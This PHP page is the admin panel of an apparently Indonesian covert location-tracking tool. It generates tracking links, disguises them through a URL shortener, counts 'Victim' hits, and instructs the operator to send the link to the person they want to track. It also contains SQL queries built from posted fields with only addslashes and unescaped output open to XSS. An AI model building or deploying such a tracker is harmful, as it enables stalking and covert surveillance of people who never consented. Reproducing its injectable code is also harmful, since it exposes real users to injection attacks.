 <?php 
 include'navbar.php';
 include'configue.php';
//  require 'vendor/autoload.php';
//  use Echevarria\Bitly\Bitly;
 ?>
<!DOCTYPE html>
<html>
<head>
	<title>Link Akurat 95%</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <style>
       .modal-dialog{
        width: 750px;
         margin: auto;
       }td,tr{
           padding:7px;
       }th{
           height:40px;
           padding:10px;
           color:white
       }@media only screen and (max-width: 600px) {
        .modal-dialog{
        width: 95%;
         margin: auto;
       }
   }

    </style>
</head>
<body>

<div class="container mt-4 mb-5">
<!-- TOMBOL TAMBAH DATA -->
<button type="button" class="btn btn-secondary mb-4" data-toggle="modal" data-target="#exampleModal">
<i style="font-size:18px" class="fa">&#xf055;</i> Tambah Link 
</button>
<?php 
   

  //$query = mysqli_query($koneksi, "SELECT * FROM links WHERE author = 'fahmi1' && jenis ='linkjs'");
  //  echo mysqli_num_rows($query);
   // echo $_SESSION['username'];

if(isset($_POST['title'],$_POST['desc'])){
    date_default_timezone_set("Asia/Bangkok");
    $title = addslashes($_POST['title']);
    $desc = addslashes($_POST['desc']);
    $tanggal = date('d-m-Y');
    $jam = date('H:s');
    $author = $_SESSION['username'];
    $ids = addslashes($_POST['ids']);
    $jenis =  addslashes($_POST['jenis']);
    $link = "https://$_SERVER[HTTP_HOST]/ramztool/hayolo.php?ids=".$ids;
    $sql = mysqli_query($koneksi, "INSERT INTO links VALUE('0','$ids','$author','$title','$desc','$link','$tanggal','$jam','$jenis')");

    if($sql){
        ?>
        <div class="alert alert-dark" role="alert">
        Link berhasil di buat!
        </div>
        
        <?php
    }else{
        ?>
        <div class="alert alert-danger" role="alert">
        Proses gagal!!
        </div>
        <?php
    }

}

?>
<!-- Modal TAMBAH DATA-->
<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
    <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Tambah Link</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <form action="" method="POST">
             <input type="hidden" name="ids" value="<?php echo rand(00000000,9999999);?>">
             <input type="hidden" name="jenis" value="linkjs">
            <input type="text" name="title" class="form-control mb-3" placeholder="Masukan Judul Link">
            <input type="text" name="desc" class="form-control mb-3" placeholder="Masukan Deskripsi">
       
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Batal</button>
        <button type="submit" class="btn btn-dark">Simpan</button>
        </form>
      </div>
    </div>
  </div>
</div>

  <table class="table text-center w-100" >
      <thead >
          <tr class="bg-dark">
              <th>No</th>
              <th>ID</th>
              <th>Title</th>
              <th>Description</th>
              <th>Victim</th>
              <th>Detail</th>
          </tr>
      </thead>
      <tbody>
      <?php
      $author = $_SESSION['username'];
      function kirim($urli){
        $cs = curl_init();
        curl_setopt($cs, CURLOPT_URL,"https://www.shorturl.at/shortener.php");                      
        curl_setopt($cs, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($cs, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($cs, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($cs, CURLOPT_HEADER, true);
        curl_setopt($cs, CURLOPT_POST, 1);
        curl_setopt($cs, CURLOPT_POSTFIELDS, "u=$urli");                        
        $result = curl_exec($cs);
        curl_close($cs);
        
        $value = strstr($result, 'value="shorturl.at/');
        $arr1 = explode(' ',trim($value));
        //echo ."\n";
        $replace1 =  str_replace('value="', '', $arr1[0]);
        $replace2 = str_replace('"', '', $replace1);
        echo $replace2;
      }
      $x = 1;
      $query = mysqli_query($koneksi, "SELECT * FROM links");
      while($data = mysqli_fetch_array($query)){
          $idd = $data['ids'];
          $sqlmap = mysqli_query($koneksi, "SELECT * FROM locat WHERE ids = '$idd'");
          $linked = $data['link'];
          $sqlmap = mysqli_query($koneksi, "SELECT * FROM locat WHERE ids = '$idd'");
      ?>
          <tr >
              <td><?php echo $x; ?></td>
              <td><?php echo $data['ids'] ?></td>
              <td><?php echo $data['title'] ?></td>
              <td><?php echo $data['deskripsi'];?></td>
              <td><?php echo mysqli_num_rows($sqlmap); ?></td>
              <td>
                <button type="button" class="btn btn-secondary" data-toggle="modal" data-target="#<?php echo $data['ids'];?>">
                Lihat
                </button>
                <!-- Modal -->
                <div class="modal fade" id="<?php echo $data['ids'];?>" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLabel">Detail</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body text-left">
                    
                        <table class="table table-striped">
                            <tr>
                              <td><b>ID</b></td>
                              <td><?php echo $data['ids'] ?></td>
                            </tr>
                            <tr>
                              <td><b>Title</b></td>
                              <td><?php echo $data['title'] ?></td>
                            </tr>
                            <tr>
                              <td><b>Deskripsi</b></td>
                              <td><?php echo $data['deskripsi'] ?></td>
                            </tr>
                            <tr>
                              <td><b>Tanggal</b></td>
                              <td><?php echo $data['tanggal'] ?></td>
                            </tr>
                            <tr>
                              <td><b>Jam</b></td>
                              <td><?php echo $data['jam'] ?></td>
                            </tr>
                            <tr>
                              <td colspan="2" class="text-center bg-secondary text-light"><b>Link</b></td>
                             </tr>
                             <tr>
                                <td colspan="2"><span class="text-danger">* </span><input type="text" value="<?php echo kirim($linked); ?>" id="myInput" readonly class="form-control"><br><button onclick="myFunction()" class="btn btn-light "><i style="font-size:18px" class="fa">&#xf24d;</i> Copy Link</button></td>
                             </tr>
                            <tr>
                              <td colspan="2">
                              <div class="card">
                                <div class="card-body">
                                <span class="text-danger">* </span> Klik copy link di atas dan kirimkan kepada orang yang ingin anda lacak!
                                </div>
                              </div>
                              </td>
                            </tr>
                        </table>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
                        <form action="hapus.php" method="POST">
                        <input type="hidden" name="ids" value="<?php echo $data['ids']; ?>">
                        <button type="submit" class="btn btn-danger">Hapus</button>
                        </form>
                       
                    </div>
                    </div>
                </div>
                </div>
               </td>

          </tr>
      <?php $x++; } ?>  
      </tbody>
  </table>
</div>
<script>
function myFunction() {
  var copyText = document.getElementById("myInput");
  copyText.select();
  copyText.setSelectionRange(0, 99999)
  document.execCommand("copy");
  alert("Copied the text: " + copyText.value);
}
</script>
</body>
</html>